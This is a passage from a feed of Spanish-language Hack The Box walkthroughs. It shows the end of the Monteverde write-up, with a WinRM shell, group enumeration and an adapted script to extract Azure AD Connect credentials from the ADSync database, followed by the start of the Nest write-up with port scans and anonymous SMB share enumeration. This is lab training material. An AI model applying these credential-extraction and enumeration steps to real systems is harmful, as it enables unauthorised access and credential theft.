&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/monteverde/Screenshot_20200120_182009.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Utilizamos &lt;code&gt;whoami /all&lt;/code&gt; para ver los permisos, grupos y privilegios que el usuario tiene.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; whoami /all

USER INFORMATION
----------------

User Name      &lt;span class=&#34;nv&#34;&gt;SID&lt;/span&gt;                                         
&lt;span class=&#34;o&#34;&gt;==============&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;============================================&lt;/span&gt;
megabank&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope S-1-5-21-391775091-850290835-3566037492-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                          &lt;span class=&#34;nv&#34;&gt;Attributes&lt;/span&gt;                                        
&lt;span class=&#34;o&#34;&gt;===========================================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;============================================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==================================================&lt;/span&gt;
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;emote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;re-Windows &lt;span class=&#34;m&#34;&gt;2000&lt;/span&gt; Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;ETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;uthenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;his Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;zure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;TLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;edium Plus Mandatory Level Label            S-1-16-8448                                                                                    

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    &lt;span class=&#34;nv&#34;&gt;State&lt;/span&gt;  
&lt;span class=&#34;o&#34;&gt;=============================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==============================&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=======&lt;/span&gt;
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Enabled

USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Dynamic Access Control on this device has been disabled.
*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que mhope pertenece al grupo de &lt;code&gt;Azure Admins&lt;/code&gt;, despues de investigar acerca de este grupo encontramos un post de XPN que explica como se puede obtener la contraseña y usario desde la base de datos del catalogo de ADSync de azure.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.xpnsec.com/azuread-connect-for-redteam/&#34;&gt;&lt;strong&gt;AzureAd - RedTeam&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el script &lt;a href=&#34;https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1&#34;&gt;&lt;strong&gt;azuread_decrypt_msol&lt;/strong&gt;&lt;/a&gt; que viene adjunto al post, modificandolo para que pueda hacer el query a la base de datos local.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$client&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;new-object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlClient&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SqlConnection&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Data Source = localhost; Initial Catalog=ADSync; Trusted_Connection=True&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/monteverde/Screenshot_20200122_225928.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las credenciales en evil-winrm obtuvimos una shell y nuestra flag &lt;strong&gt;root.txt&lt;/strong&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/monteverde/Screenshot_20200122_230055.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/monteverde/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/monteverde/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>windows</category>
            
          
            
              <category>azureAD</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Nest</title>
        <link>https://sckull.github.io/posts/nest/</link>
        <pubDate>Thu, 04 Jun 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Thu, 04 Jun 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/nest/</guid>
        <description>Nest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Nest es una maquina de HackTheBox aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/nest/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th&gt;Nest&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;OS&lt;/td&gt;
&lt;td&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;IP&lt;/td&gt;
&lt;td&gt;10.10.10.178&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/158833&#34;&gt;VbScrub&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y servicios con masscan y nmap, encontramos el puerto samba (445) y el puerto 2386 abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2020-01-29 04:56:39 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 4386/tcp on 10.10.10.178                                  
Discovered open port 445/tcp on 10.10.10.178

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Tue Jan 28 22:23:24 2020 as: nmap -p- --min-rate 1000 -sV -sC -o nmap_scan 10.10.10.178&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.178
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.34s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;65533&lt;/span&gt; filtered ports
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
4386/tcp open  unknown
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; fingerprint-strings: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Reporting Service V1.2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Reporting Service V1.2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Unrecognised &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Help: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     Reporting Service V1.2
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     This service allows users to run queries against databases using the legacy HQK format
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     AVAILABLE COMMANDS ---
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     LIST
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     SETDIR &amp;lt;Directory_Name&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     RUNQUERY &amp;lt;Query_ID&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     DEBUG &amp;lt;Password&amp;gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    HELP &amp;lt;Command&amp;gt;

... &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;snip&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ...

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: 1m15s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2020-01-29T04:29:38
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2020-01-29T03:11:05

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue Jan 28 22:29:02 2020 -- 1 IP address (1 host up) scanned in 338.05 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smbclient&#34;&gt;SMBCLIENT&lt;/h2&gt;
&lt;p&gt;Listamos los SHARENAMES de la maquina, vemos que existe Data, Secure$ y Users, en los cuales tenemos acceso.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest# smbclient -L 10.10.10.178
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Data            Disk      
	IPC$            IPC       Remote IPC
	Secure$         Disk      
	Users           Disk      
SMB1 disabled -- no workgroup available
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos el SHARENAME Data con un usuario &amp;lsquo;anonimo&amp;rsquo; y sin contraseña para enumerar los archivos, encontramos dentro de Shared dos archivos de texto.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/nest# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.178&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;Data
Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oot&lt;span class=&#34;s1&#34;&gt;&amp;#39;s password: 
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Try &amp;#34;help&amp;#34; to get a list of possible commands.
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;smb: \&amp;gt; dir
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  .                                   D        0  Wed Aug  7 16:53:46 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  ..                                  D        0  Wed Aug  7 16:53:46 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  IT                                  D        0  Wed Aug  7 16:58:07 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Production                          D        0  Mon Aug  5 15:53:38 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Reports                             D        0  Mon Aug  5 15:53:44 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;  Shared                              D        0  Wed Aug  7 13:07:51 2019
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
